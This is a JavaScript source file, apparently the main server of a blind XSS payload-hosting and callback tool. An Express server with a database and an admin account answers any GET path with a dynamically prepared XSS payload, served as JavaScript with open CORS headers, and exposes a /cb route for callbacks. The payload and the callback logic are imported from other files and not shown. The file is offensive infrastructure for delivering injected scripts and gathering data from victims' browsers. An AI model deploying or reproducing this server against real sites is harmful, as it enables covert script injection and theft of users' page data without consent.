import express from "express";
import { PrismaClient } from "@prisma/client";
import { preparePayload } from "./helpers/prepare-payload.js";
import callbackRouter from "./routes/callback.js";
import apiRouter from "./routes/api.js";
import configureAdmin from "./helpers/startup.js";

// Create Prisma client instance and test the connection
const prisma = new PrismaClient();
try {
    await prisma.$connect();
    console.log("Successfully connected to database");
} catch (error) {
    console.error("Prisma connection error:", error);
}

// Prerequisite: Ensure that the admin account is created
configureAdmin();

// Express Server
const server = express();
server.use(express.json({limit:'10mb'}));

// debug
// server.use((req, res, next) => {
//     console.log(req.ip)
//     next();
// })

// Routes
server.use("/api", apiRouter);
server.use("/cb", callbackRouter);
server.options("/", (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.status(200).send();
});

// Serve the XSS payload
server.get("/*", async (req, res) => {
    const result = await preparePayload(req)

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');

    // File Type
    res.setHeader('Content-Type', 'application/javascript');
    res.status(200).send(result);
})

server.listen(3000, () => {
    console.log("Server running on port 3000");
});